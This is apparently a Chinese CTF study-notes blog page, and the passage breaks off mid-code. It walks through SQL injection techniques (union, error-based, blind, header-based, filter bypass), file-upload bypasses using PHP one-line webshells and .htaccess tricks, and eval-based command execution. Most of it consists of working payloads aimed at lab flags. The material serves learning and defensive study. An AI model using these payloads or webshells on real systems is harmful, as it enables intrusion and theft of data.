默认口令</span><br><span class="line"></span><br><span class="line">- 思路：靠社会工程的检索能力</span><br><span class="line"></span><br><span class="line">### SQL注入</span><br><span class="line"></span><br><span class="line">#### 整数型</span><br><span class="line"></span><br><span class="line">检查是否存在注入</span><br><span class="line"></span><br><span class="line">```sql</span><br><span class="line">xx = ? and 1=1 # 返回正确</span><br><span class="line">xx = ? and 1=2 # 返回错误</span><br></pre></td></tr></table></figure><p>猜字段数（x为数字） 得出字段数</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xx <span class="operator">=</span> ? <span class="keyword">order</span> <span class="keyword">by</span> x</span><br></pre></td></tr></table></figure><p>爆数据库名</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xx <span class="operator">=</span> ? <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,database()</span><br></pre></td></tr></table></figure><p>爆表名</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xx <span class="operator">=</span> ? <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,...,group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;数据库名&#x27;</span> </span><br></pre></td></tr></table></figure><p>爆列名</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xx <span class="operator">=</span> ? <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,...,group_concat(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;flag&#x27;</span> </span><br></pre></td></tr></table></figure><p>获得flag</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xx <span class="operator">=</span> ? <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,...,group_concat(flag) <span class="keyword">from</span> flag.flag</span><br></pre></td></tr></table></figure><p>其中… 的数量为<code>order by x</code>中的x</p><h4><span id="字符型">字符型</span></h4><p>字符型注入要考虑到  引号闭合  和  注释 </p><p>判断注入</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and 1=1 # 返回正确</span></span><br><span class="line"><span class="string">?id=1&#x27;</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span> # 返回错误</span><br></pre></td></tr></table></figure><p>猜字段</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; order by 2 # 返回正确</span></span><br><span class="line"><span class="string">?id=1&#x27;</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">3</span> # 返回错误</span><br></pre></td></tr></table></figure><p>爆数据库名</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and 1=2 union select 1,database()</span></span><br></pre></td></tr></table></figure><p>爆表名</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and 1=2 union select 1,group_concat(table_name)from information_schema.tables where table_schema=&#x27;</span>sqli<span class="string">&#x27;</span></span><br></pre></td></tr></table></figure><p>爆列名</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and 1=2 union select 1,group_concat(column_name) from information_schema.columns where table_name=&#x27;</span>flag<span class="string">&#x27;</span></span><br></pre></td></tr></table></figure><p>爆字段内容（flag）</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and 1=2 union select 1,group_concat(flag) from sqli.flag</span></span><br></pre></td></tr></table></figure><h4><span id="报错注入">报错注入</span></h4><figure class="highlight plaintext"><figcaption><span>:对[XML](https://so.csdn.net/so/search?q</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">```extractvalue(目标xml文档，xml路径)```</span><br><span class="line"></span><br><span class="line">&gt; 第一个参数 : 第一个参数可以传入目标xml文档</span><br><span class="line">&gt;</span><br><span class="line">&gt; 第二个参数： xml中的位置是可操作的地方，xml文档中查找字符位置是用 /xxx/xxx/xxx/…这种格式，如果我们写入其他格式，就会报错，并且会返回我们写入的非法格式内容，而这个非法的内容就是我们想要查询的内容。</span><br><span class="line">&gt;</span><br><span class="line">&gt; 可以用 0x5c  (‘\)，还可以使用0x7e (~)，使得sql非法</span><br><span class="line"></span><br><span class="line">查询数据库</span><br><span class="line"></span><br><span class="line">```sql</span><br><span class="line">?id=1 and extractvalue(1,concat(0x7e,database(),0x7e))</span><br></pre></td></tr></table></figure><p>爆表名</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> <span class="keyword">and</span> extractvalue(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database()),<span class="number">0x7e</span>))</span><br></pre></td></tr></table></figure><p>爆列名</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> <span class="keyword">and</span> extractvalue(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> group_concat(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;flag&#x27;</span>),<span class="number">0x7e</span>))</span><br></pre></td></tr></table></figure><p>爆数据</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> <span class="keyword">and</span> extractvalue(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> flag <span class="keyword">from</span> flag),<span class="number">0x7e</span>))</span><br></pre></td></tr></table></figure><p><strong>mid函数</strong></p><blockquote><p>MID()函数用于从文本字段中提取字符。 SELECT MID(column_name,start[,length]) FROM table_name;</p></blockquote><table><thead><tr><th>参数</th><th>描述</th></tr></thead><tbody><tr><td>column_name</td><td>必需。要提取字符的字段。</td></tr><tr><td>start</td><td>必需。规定开始位置（起始值是 1）。</td></tr><tr><td>length</td><td>可选。要返回的字符数。如果省略，则 MID() 函数返回剩余文本。</td></tr></tbody></table><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> <span class="keyword">and</span> extractvalue(<span class="number">1</span>,concat(<span class="number">0x7e</span>,mid((<span class="keyword">select</span> flag <span class="keyword">from</span> flag),<span class="number">1</span>,<span class="number">16</span>),<span class="number">0x7e</span>))</span><br><span class="line"></span><br><span class="line"><span class="number">1</span> <span class="keyword">and</span> extractvalue(<span class="number">1</span>,concat(<span class="number">0x7e</span>,mid((<span class="keyword">select</span> flag <span class="keyword">from</span> flag),<span class="number">17</span>),<span class="number">0x7e</span>))</span><br><span class="line"># 拼接得到flag</span><br></pre></td></tr></table></figure><h4><span id="布尔注入">布尔注入</span></h4><p>只会返回正确或者错误，因此我们需要构造<code>if</code>语句进行注入，手动过程供参考，还是用sqlmap靠谱。</p><ul><li>先猜测数据库长度</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> <span class="keyword">and</span> (length(database()))<span class="operator">&gt;</span><span class="number">5</span> # 结果是error</span><br><span class="line"><span class="number">1</span> <span class="keyword">and</span> (length(database()))<span class="operator">=</span><span class="number">4</span> # 结果是success</span><br></pre></td></tr></table></figure><ul><li>猜测数据库名</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> <span class="keyword">and</span> ascii(substr(database(),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">110</span> # 可以二分法来确认每个字母 </span><br></pre></td></tr></table></figure><ul><li>得到数据库表中数量</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> <span class="keyword">and</span> (<span class="keyword">select</span> <span class="built_in">count</span>(table_name) <span class="keyword">from</span> information_schema.tables</span><br><span class="line"> <span class="keyword">where</span> table_schema<span class="operator">=</span>database())<span class="operator">=</span><span class="number">2</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>得到表名</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> <span class="keyword">and</span> ascii(substr((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables</span><br><span class="line"> <span class="keyword">where</span> table_schema<span class="operator">=</span>database() limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">110</span></span><br><span class="line"># (不断改变范围，把第一张数据表的第一个字母猜解出来)</span><br><span class="line"></span><br><span class="line"><span class="number">1</span> <span class="keyword">and</span> ascii(substr((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables</span><br><span class="line"> <span class="keyword">where</span> table_schema<span class="operator">=</span>database() limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">2</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">110</span></span><br><span class="line"># (不断改变范围，把第一张数据表的第二个字母猜解出来)</span><br><span class="line"></span><br><span class="line"><span class="number">1</span> <span class="keyword">and</span> ascii(substr((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables</span><br><span class="line"> <span class="keyword">where</span> table_schema<span class="operator">=</span>database() limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">3</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">110</span></span><br><span class="line"># (不断改变范围，把第一张数据表的第三个字母猜解出来)</span><br><span class="line"></span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line"># 最后得到表名为news</span><br><span class="line"></span><br><span class="line"><span class="number">1</span> <span class="keyword">and</span> ascii(substr((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables</span><br><span class="line"> <span class="keyword">where</span> table_schema<span class="operator">=</span>database() limit <span class="number">1</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">110</span></span><br><span class="line"># (不断改变范围，把第二张数据表的第一个字母猜解出来)</span><br><span class="line"></span><br><span class="line"><span class="number">1</span> <span class="keyword">and</span> ascii(substr((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables</span><br><span class="line"> <span class="keyword">where</span> table_schema<span class="operator">=</span>database() limit <span class="number">1</span>,<span class="number">1</span>),<span class="number">2</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">110</span></span><br><span class="line"># (不断改变范围，把第二张数据表的第二个字母猜解出来)</span><br><span class="line"></span><br><span class="line"><span class="number">1</span> <span class="keyword">and</span> ascii(substr((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables</span><br><span class="line"> <span class="keyword">where</span> table_schema<span class="operator">=</span>database() limit <span class="number">1</span>,<span class="number">1</span>),<span class="number">3</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">110</span></span><br><span class="line"># (不断改变范围，把第二张数据表的第三个字母猜解出来)</span><br><span class="line"></span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line"># 最后得到表名为flag</span><br></pre></td></tr></table></figure><ul><li>猜测flag表的字段数</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> <span class="keyword">and</span> (<span class="keyword">select</span> <span class="built_in">count</span>(column_name) <span class="keyword">from</span> information_schema.columns</span><br><span class="line"> <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;flag&#x27;</span>)<span class="operator">=</span><span class="number">1</span></span><br><span class="line"></span><br><span class="line"># 得到flag只有一个字段</span><br></pre></td></tr></table></figure><ul><li>猜测字段名</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> <span class="keyword">and</span> ascii(substr((<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns</span><br><span class="line"> <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;flag&#x27;</span>),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">110</span></span><br><span class="line">#(不断改变范围，把字段名猜解出来)</span><br><span class="line">#......</span><br><span class="line">#得到字段名也为flag</span><br></pre></td></tr></table></figure><ul><li>猜测flag</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> <span class="keyword">and</span> ascii(substr((<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> sqli.flag <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">110</span></span><br><span class="line"><span class="number">1</span> <span class="keyword">and</span> ascii(substr((<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> sqli.flag <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span>),<span class="number">2</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">110</span></span><br><span class="line"><span class="number">1</span> <span class="keyword">and</span> ascii(substr((<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> sqli.flag <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span>),<span class="number">3</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">110</span></span><br><span class="line"></span><br><span class="line">#......</span><br><span class="line">#这是一个巨大的工作量，所以应该积累到的一个经验是：</span><br><span class="line">#手工盲注特别繁琐，碰到这类题目要会用工具sqlmap</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4><span id="mysql结构">MySQL结构</span></h4><h4><span id="时间盲注">时间盲注</span></h4><p>原理和布尔盲注差不多，通过返回时间来判断</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>((substr(database(),<span class="number">1</span>,<span class="number">1</span>)=&#x27;s&#x27;),sleep(<span class="number">1</span>),<span class="number">1</span>)</span><br></pre></td></tr></table></figure><h4><span id="cookie注入">cookie注入</span></h4><p>首先通过抓包，发现浏览器返回cookie: id&#x3D;1</p><p>使用postman进行发包处理</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">id <span class="operator">=</span> <span class="number">1</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">3</span> # <span class="number">1</span>和<span class="number">2</span>均可回显，说明数据库有两行</span><br><span class="line">id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>；# 查看页面回显位，发现<span class="number">1</span>，<span class="number">2</span>都可以进行回显</span><br><span class="line">id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> version(),database() # 开始注入，获取数据库版本和数据库名 </span><br><span class="line">id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> group_concat(table_name),<span class="number">2</span> <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;sqli&#x27;</span> # 因为数据库版本大于<span class="number">5.0</span>，所以我们可以通过查询information_schema表来获取表名和列名，获得表名称为gdctsoiitj</span><br><span class="line">id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> group_concat(column_name),<span class="number">2</span> <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;gdctsoiitj&#x27;</span> # 得到表名后，继续查询列名，获得列名称为zrxzhzkosa</span><br><span class="line">id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> zrxzhzkosa,<span class="number">2</span> <span class="keyword">from</span> gdctsoiitj # 得到列名后，查询数据得到flag，需要注意这题的表名和列名每个环境都不一样</span><br></pre></td></tr></table></figure><ul><li><p>为什么id&#x3D;-1而不是1</p><blockquote><pre><code> 1. 经过查阅资料得知，数据库中id的数据类型设置为int（数值类型）就会出现这种情况，如果数据库检查到id的参数并不为数值的话，就会发生类型转换 2. 本题ID=1，我想注入的时候就不能再注ID=1了(要查询数据库不存在的结果，否则存在的结果占位显示我们就看不到第二行的数据) 3. 用联合查询语句union select语句来注入，从而判断显示位,同时也是判断注入点，此时要先保证之前的数据查不出来才能判断注入位置，不然就会一直在注入当前的数据库，无法注入新的值来判断注入点，之后再union select id=-1数据不存在数据库中，可以看到位置2可以插入SQL语句。</code></pre><p>总结一下：<br>比如字符串’1’会被转换为1</p><p>比如字符串’1”‘会被转换为1</p><p>比如’1 and 1&#x3D;1’会被识别为1</p><p>比如’1 and 1&#x3D;2’会被识别为1</p><p>比如’1akbucbdadbaiudadbabdaud’会被识别为1</p><p>比如’23adasuasdai32ansoiha’会被识别为23</p><p>字符串中数字后面的字符可以是任意的，类型转换时都会被忽略，不会对数值有任何的影响</p></blockquote></li><li><p>为什么要用到<code>group_concat</code></p><blockquote><p>因为需要在一行输出所有的结果</p></blockquote></li></ul><h4><span id="ua注入">UA注入</span></h4><ul><li>和cookie注入流程一致</li></ul><h4><span id="referer注入">Referer注入</span></h4><ul><li>和cookie注入流程一致</li></ul><h4><span id="过滤空格">过滤空格</span></h4><p>随着黑客技术的提升，我们开发人员的防护措施也越来越多，为了防止sql注入，开发人员通常会在后台过滤某些非正常用户输入的字符，例如union、select、单引号双引号等等。</p><ul><li>可以通过&#x2F;**&#x2F;来代替空格</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span> <span class="operator">=</span> <span class="number">1</span> # 发现被过滤了</span><br><span class="line"><span class="number">1</span><span class="comment">/**/</span><span class="keyword">and</span><span class="comment">/**/</span><span class="number">1</span><span class="comment">/**/</span><span class="operator">=</span><span class="comment">/**/</span><span class="number">1</span> # 发现正确，继续构造payload语句，发现等于<span class="number">2</span>时回显错误，说明此题存在过滤空格注入</span><br><span class="line"><span class="number">1</span><span class="comment">/**/</span><span class="keyword">order</span><span class="comment">/**/</span><span class="keyword">by</span><span class="comment">/**/</span><span class="number">2</span> # 查看有几位</span><br><span class="line"><span class="number">1</span><span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>,<span class="number">2</span> # 发现无回显，需要加负号操作</span><br><span class="line"><span class="number">-1</span><span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>,<span class="number">2</span> # 成功发现回显</span><br><span class="line"><span class="number">-1</span><span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>,version() # 发现回显位</span><br><span class="line"><span class="number">-1</span><span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>,database()</span><br><span class="line"><span class="number">-1</span><span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>,group_concat(schema_name)<span class="keyword">from</span><span class="comment">/**/</span>information_schema.schemata # 查看所有数据库</span><br><span class="line"><span class="number">-1</span><span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>,group_concat(table_name)<span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>information_schema.tables<span class="comment">/**/</span><span class="keyword">where</span><span class="comment">/**/</span>table_schema<span class="operator">=</span><span class="string">&#x27;sqli&#x27;</span></span><br><span class="line"><span class="number">-1</span><span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>,group_concat(column_name)<span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>information_schema.columns<span class="comment">/**/</span><span class="keyword">where</span><span class="comment">/**/</span>table_schema<span class="operator">=</span><span class="string">&#x27;sqli&#x27;</span><span class="comment">/**/</span><span class="keyword">and</span><span class="comment">/**/</span>table_name<span class="operator">=</span><span class="string">&#x27;lqsyncyuso&#x27;</span></span><br><span class="line"><span class="number">-1</span><span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>,group_concat(nuyietobbn)<span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>sqli.lqsyncyuso</span><br></pre></td></tr></table></figure><h3><span id="文件上传">文件上传</span></h3><ul><li>tips: MacBook上有个坑，上传隐藏文件时候需要配合命令<code>command+shift+.</code></li></ul><h4><span id="无验证">无验证</span></h4><ol><li>通过Wappalyzer来查看当前页面的基础环境，如中间件，前后端语言等 </li><li>将一句话木马上传到服务器</li></ol><ul><li>php的一句话木马</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(@<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><ol start="3"><li>通过中国蚁剑进行控制，找到flag</li></ol><h4><span id="前端验证">前端验证</span></h4><ul><li>和无验证差不多，唯一的区别是前端检查了我们上传的文件名。</li></ul><ol><li>禁用js来解决</li><li>使用burpsuite，先将一句话木马后缀修改成.png，然后抓包后缀修改成php，从而达到攻击的目的</li></ol><h4><span id="htaccess">.htaccess</span></h4><blockquote><p>htaccess 文件是 Apache 服务器中的一个配置文件，它负责相关目录下的网页配置。通过 htaccess 文件，可以帮我们实现：网页 301 重定向、自定义 404 错误页面、改变文件扩展名、允许&#x2F;阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。</p></blockquote><ol><li><p>使用 FilesMatch 命令生成一个.htaccess 文件进行上传，绕过白名单中的漏洞</p><ul><li><p>需要构造.htaccess文件，其中<code>FilesMatch</code> 就是我们要上传的文件</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">FilesMatch</span> &quot;<span class="attr">payload</span>&quot;&gt;</span></span><br><span class="line"> SetHandler application/x-httpd-php</span><br><span class="line"><span class="tag">&lt;/<span class="name">FilesMatch</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>上传一句话木马，名字为FilesMatch设置的<code>payload</code></p></li></ul></li><li><p>使用passthru执行外部命令</p><ul><li>第一步一样是构造.htaccess文件</li><li>第二步，使用passthru执行外部命令</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">passthru</span>(<span class="string">&quot;ls /var/www/&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>然后通过浏览器访问<code>http://xxxx/upload/payload</code>来执行命令</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">passthru</span>(<span class="string">&quot;cat /var/www/html/flag_828011517.php&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>添加.htaccess文件</p><ul><li>句话的作用是：让jpg文件中的php语句执行，这句语句放到.htaccess文件中，Apache运行的时候会解析这个文件中的配置，检测到这句话以后，jpg文件中的php语句才会执行</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType application/x-httpd-php .jpg</span><br></pre></td></tr></table></figure><ul><li>上传一句话木马，以.jpg结尾</li><li>使用蚁剑进行连接</li></ul></li></ol><h4><span id="mime">MIME</span></h4><ul><li>上传php文件，并将content-type改成image&#x2F;png即可</li></ul><h4><span id="文件头检查">文件头检查</span></h4><p>原理：服务器会检查png的头格式</p><ul><li><p>截图上传文件，通过<code>burpsuite</code>进行代理</p></li><li><p>在图片后面添加一句话木马</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>修改文件后缀.php</p></li><li><p>使用蚁剑连接</p></li></ul><h4><span id="00截断">00截断</span></h4><p><strong>%00的使用是在路径上</strong></p><p>就是在.php文件后加上%00后接.jpg，这里我们就可以绕过对php文件的过滤。在执行时，%00会把后面的.jpg截断，所以执行的时候他执行的仍然是前面的.php文件。就可以实现我们的马子文件的执行。</p><h4><span id="双写后缀">双写后缀</span></h4><p>原理：服务器会替换后缀’php’-&gt;’’，因此我们只需要拼接后缀为”pphphp”即可</p><h3><span id="rce">RCE</span></h3><h4><span id="eval执行">eval执行</span></h4><p>进入后题目</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;cmd&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$_REQUEST</span>[<span class="string">&quot;cmd&quot;</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>尝试在URL中带上名为cmd的参数：（此处<code>system()</code>函数的作用为执行系统命令并输出执行结果）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 